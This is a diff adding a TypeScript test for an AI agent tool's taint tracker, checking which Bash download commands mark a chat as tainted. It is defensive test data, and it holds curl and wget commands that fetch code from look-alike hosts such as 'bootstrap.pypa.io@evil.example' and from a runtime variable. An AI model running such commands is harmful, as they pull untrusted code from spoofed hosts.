@@ -200,6 +200,49 @@ describe('what taints a chat', () => {
       { kind: 'web', label: 'example.com' },
     ]);
   });
+
+  it('bootstrapping from the tooling’s own hosts marks nothing; anyone else’s download does (ADR 0117, 2026-10-09)', () => {
+    const bash = (command: string) => taintFrom('Bash', { command });
+    for (const command of [
+      'curl -sS https://bootstrap.pypa.io/get-pip.py -o get-pip.py && python3 get-pip.py --user',
+      'python3 -m venv .venv && curl -sS https://bootstrap.pypa.io/get-pip.py -o get-pip.py && .venv/bin/python get-pip.py',
+      'curl -LsSf https://astral.sh/uv/install.sh -o uv-install.sh',
+      'wget https://www.python.org/ftp/python/3.13.0/Python-3.13.0.tgz',
+      'curl -O https://nodejs.org/dist/v22.0.0/node-v22.0.0.tar.gz',
+    ])
+      expect(bash(command), command).toBeUndefined();
+    for (const command of [
+      // A page about a package is its author's words.
+      'curl -s https://pypi.org/pypi/fonttools/json',
+      'curl -s https://raw.githubusercontent.com/someone/fonts/main/README.md',
+      // A look-alike host, a second download from elsewhere, an address worked out as it runs.
+      'curl https://bootstrap.pypa.io.evil.example/get-pip.py',
+      'curl https://bootstrap.pypa.io@evil.example/get-pip.py',
+      'curl -o a.py https://bootstrap.pypa.io/get-pip.py && wget evil.example/page',
+      'curl -o a.py https://bootstrap.pypa.io/get-pip.py && curl "$NEXT"',
+    ])
+      expect(bash(command), command).toMatchObject({ kind: 'download' });
+    // A chat an older rule marked for pip's bootstrap stops being held by it.
+    const at = { conversationId: 'c', at: 1 };
+    const events = [
+      {
+        ...at,
+        seq: 0,
+        type: 'tool.started',
+        toolUseId: 'p',
+        name: 'Bash',
+        input: { command: 'curl -sS https://bootstrap.pypa.io/get-pip.py -o get-pip.py' },
+      },
+      {
+        ...at,
+        seq: 1,
+        type: 'taint',
+        toolUseId: 'p',
+        source: { kind: 'download', label: 'bootstrap.pypa.io' },
+      },
+    ] as ConversationEvent[];
+    expect(heldTaints(events)).toEqual([]);
+  });
 });
 
 describe('cards of what’s known', () => {
